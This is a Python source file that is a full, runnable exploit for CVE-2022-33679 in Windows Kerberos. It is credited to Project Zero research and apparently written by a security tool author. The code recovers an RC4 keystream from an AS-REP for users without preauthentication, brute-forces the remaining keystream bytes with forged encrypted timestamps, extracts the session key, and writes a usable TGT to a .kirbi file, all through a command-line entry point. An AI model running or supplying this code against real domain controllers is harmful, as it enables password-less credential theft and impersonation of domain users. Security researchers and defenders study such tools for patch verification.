# Exploit for CVE-2022-33679
# 
# This attack will work if the following conditions are met:
#  - DC is not patched
#  - Target user account is marked with the "Do not require Kerberos preauthentication" flag (check UAC)
#  - DC allows RC4_MD4 kerberos cipher to be used. Etype: -128 
# 
# Original project-zero issue: https://bugs.chromium.org/p/project-zero/issues/detail?id=2310
# Writeup: https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html
# 
# Found by: 
#  James Forshaw (@tiraniddo), Project Zero
#  
# This code by:
#  Tamas Jos (@skelsec)
#

import datetime
import logging
import asyncio
import base64
from minikerberos.common.factory import KerberosClientFactory, kerberos_url_help_epilog
from minikerberos.aioclient import AIOKerberosClient
from minikerberos.protocol.constants import EncryptionType
from minikerberos.protocol.encryption import Key, _enctype_table
from minikerberos.protocol.asn1_structs import PA_ENC_TS_ENC, HostAddress,\
	KRB_CRED, KrbCredInfo, EncKrbCredPart, EncryptedData, EncryptionKey,\
	PrincipalName, TicketFlags

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def get_padding_data():
	# for the attack to work, we need a TGT with a larger-than-normal AS-REP enc-data
	# we achieve this by adding a lot of hostaddresses in the AS-REQ, 
	# which will be reflected in the AS-REP
	hosts = []
	for x in range(50):
		hd = {
			'addr-type' : 1,
			'address' : b'\x00'*2 + x.to_bytes(2, byteorder='big', signed=False)
		}
		hosts.append(HostAddress(hd))
	return hosts

def calc_known_plaintext(cipher):
	# returns the known values for the initial structure which depends on the length
	# original data starts with 24 bytes of \x00 then the ASN1 struct
	# the first 24 bytes is where the cofounder and mac should be but in this case it's just zeroes
	cipher_length = len(cipher)
	if cipher_length <= 127:
		raise Exception('NO')
	header_length = 24
	data_length = cipher_length - header_length
	first_len = data_length - 4
	second_len = first_len - 4
	return b'\x00'*24 + b'\x79\x82' + first_len.to_bytes(2, byteorder='big', signed=False) + b'\x30\x82'+ second_len.to_bytes(2, byteorder='big', signed=False) +b'\xA0\x1B\x30\x19\xA0\x03\x02\x01\x80\xA1\x12\x04\x10'

def get_crafted_timestamp(n, now):
	# manually crafting a timestamp field for this exploit to work is an 
	# interesting yet painful thing to do.
	# See the writeup for more info, it's too long to explain here
	now = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)
	nowstr = now.strftime('%Y%m%d%H%M%SZ')
	t = nowstr.encode() + b'\x00'
	tt = b'\x18'+len(t).to_bytes(1, byteorder='big', signed=False) + t
	ts_end = b'\xA0' + len(tt).to_bytes(1, byteorder='big', signed=False) + tt
	if n == 0:
		timestamp = b'\x30' + len(ts_end).to_bytes(1, byteorder='big', signed=False) + ts_end
	else:
		x = (0x80 + n).to_bytes(1, byteorder='big', signed=False) + b'\x00'*(n-1) + len(ts_end).to_bytes(1, byteorder='big', signed=False)
		timestamp = b'\x30'+ x + ts_end

	return timestamp

def format_kirbi(data, n = 100):
	kd = base64.b64encode(data).decode()
	return '    ' + '\r\n    '.join([kd[i:i+n] for i in range(0, len(kd), n)])

def tgt_to_kirbi(tgt, sessionkey, now):
	keyd = {
		'keytype': -128, 
		'keyvalue': sessionkey
	}

	ci = {}
	ci['key'] = EncryptionKey(keyd)
	ci['prealm'] = tgt['crealm']
	ci['pname'] = tgt['cname']
	ci['flags'] = TicketFlags(set(['enc-pa-rep', 'forwardable', 'renewable', 'initial', 'proxiable'])) #guessing...
	ci['authtime'] = now
	ci['starttime'] = now
	ci['endtime'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
	ci['renew-till'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
	ci['srealm'] = tgt['crealm'] # guessing! modify this if not valid....
	ci['sname'] = PrincipalName({'name-type': 1, 'name-string': ['krbtgt', tgt['crealm']]})

	ti = {}
	ti['ticket-info'] = [KrbCredInfo(ci)]

	te = {}
	te['etype']  = 0
	te['cipher'] = EncKrbCredPart(ti).dump()

	t = {}
	t['pvno'] = 5
	t['msg-type'] = 22
	t['enc-part'] = EncryptedData(te)
	t['tickets'] = [tgt['ticket']]

	return KRB_CRED(t)

async def exploit(kerberos_url, kirbifile=None):
	cu = KerberosClientFactory.from_url(kerberos_url)
	print('[+] FETCHING TGT...')
	client = cu.get_client()
	padding_data = {
		'addresses' : get_padding_data()
	}
	craftticket = client.build_asreq_lts(EncryptionType.ARCFOUR_MD4, kdc_req_body_extra=padding_data, no_preauth=True)
	rep = await client.ksoc.sendrecv(craftticket.dump())
	tgt = rep.native
	print('[+] GOT TGT...')
	
	now = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)
	timestamp = PA_ENC_TS_ENC({'patimestamp': now.replace(microsecond=0)}).dump() #
	
	cipher_data = tgt['enc-part']['cipher']
	plaintext_data = calc_known_plaintext(cipher_data)
	cipher_data_header = cipher_data[:len(plaintext_data)]
	print('[+] PLAINTEXT FRAGMENT: %s ' % plaintext_data.hex())
	keystream = byte_xor(cipher_data_header, plaintext_data)
	print('[+] PARTIAL KEYSTREAM : %s' % keystream.hex())
	
	# verifying the guessed partial keystream by requesting a TGT but this time with pre-auth
	# the pre-auth will need the encrypted timestamp which we can forge with the partial keystream 
	print('[+] VERIFYING KEYSTREAM...')
	print('[i] TIMESTAMP    : %s' % timestamp.hex())
	enc_timestamp = byte_xor(b'\x00'*24+timestamp, keystream)
	print('[i] ENC TIMESTAMP: %s' % enc_timestamp.hex())
	craftticket = client.build_asreq_lts(EncryptionType.ARCFOUR_MD4, enctimestamp=enc_timestamp, newnow=now)
	#print('[i] CRAFTED AS-REQ: %s' % craftticket.dump().hex())
	rep = await client.ksoc.sendrecv(craftticket.dump())
	rep = rep.native
	if rep['msg-type'] == 30:
		print('[-] FAILED! Keystream is not good')
		return

	print('[+] PARTIAL KEYSTREAM WORKS! Got code : %s' % rep['msg-type'])
	print('[+] GUESSING REMAINING KEYSTREAM BYTES...')
	ctr = 0
	orig_keystream_len = len(keystream)
	for tslen in range(0,4): #5 is minumum
		for byteguess in range(256):
			ctr += 1
			byteguess = byteguess.to_bytes(1, byteorder='big', signed=False)
			keystream_guess = keystream + byteguess
			timestamp = get_crafted_timestamp(tslen, now)
			#print('TIMESTAMP ASCII  : %s' % timestamp)
			#print('TIMESTAMP        : %s' % timestamp.hex())
			#print('GUESSED KEYSTREAM: %s' % (keystream_guess).hex())
			enc_timestamp = byte_xor(b'\x00'*24+timestamp, keystream_guess)
			#print('ENC TIMESTAMP    : %s' % enc_timestamp.hex())
			craftticket = client.build_asreq_lts(EncryptionType.ARCFOUR_MD4, enctimestamp=enc_timestamp, newnow=now)
			#print('CRAFTED AS-REQ: %s' % craftticket.dump().hex())
			rep = await client.ksoc.sendrecv(craftticket.dump())
			rep = rep.native
			if rep['msg-type'] == 30:
				#print('Guessed wrong...')
				continue
			
			print('[+] Correctly guessed keystream byte position %s: 0x%s' % (hex(orig_keystream_len+tslen), byteguess.hex()))
			keystream = keystream_guess
			break
		else:
			print('All guesses failed!!!')
			return

	print('[+] GUESSED KEYSTREAM IN %s ITERATIONS' % ctr)
	now = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)
	timestamp = PA_ENC_TS_ENC({'patimestamp': now.replace(microsecond=0)}).dump() #
	
	#creating timestamp asn1
	print('[+] REQUESTING FRESH TGT')
	enc_timestamp = byte_xor(b'\x00'*24+timestamp, keystream)
	craftticket = client.build_asreq_lts(EncryptionType.ARCFOUR_MD4, enctimestamp=enc_timestamp, newnow=now)
	rep = await client.ksoc.sendrecv(craftticket.dump())
	rep = rep.native
	if rep['msg-type'] == 30:
		print('FAILED! Keystream is not good :(')
		return

	print('[+] DECRYPTING AS-REP WITH KEYSTREAM')
	dec_data = byte_xor(rep['enc-part']['cipher'], keystream)
	session_key = dec_data[43:48] + b'\xAB' * 11
	print('[+] FOUND SESSION KEY: %s' % session_key.hex())

	client.kerberos_TGT = rep
	client.kerberos_cipher = _enctype_table[-128]
	client.kerberos_cipher_type = -128
	client.kerberos_session_key = Key(-128, session_key)
	
	kirbi = tgt_to_kirbi(rep, session_key, now).dump()
	print('[+] KIRBI DATA:')
	print(format_kirbi(kirbi))
	filename = '%s.kirbi' % (now.strftime("%Y%m%d_%H%M%S"))
	if kirbifile is not None:
		filename = kirbifile
	
	print('[+] Writing .kirbi file to: %s' % filename)
	with open(filename, 'wb') as f:
		f.write(kirbi)
	

def main():
	import argparse
	
	parser = argparse.ArgumentParser(description='Fetches TGT&session key for user who doesnt need kerberos preauth. CVE-2022-33679.', usage='Use it with a valid kerberus URL but any password. Example: "cve202233679 \'kerberos+none://TEST\\asreptest@10.10.10.2\'"')
	parser.add_argument('kerberos_url', help='the kerberos target string. ')
	parser.add_argument('-v', '--verbose', action='count', default=0)
	
	args = parser.parse_args()
	if args.verbose == 0:
		logging.basicConfig(level=logging.INFO)
	elif args.verbose == 1:
		logging.basicConfig(level=logging.DEBUG)
	else:
		logging.basicConfig(level=1)
	
	asyncio.run(exploit(args.kerberos_url))
	
	
if __name__ == '__main__':
	main()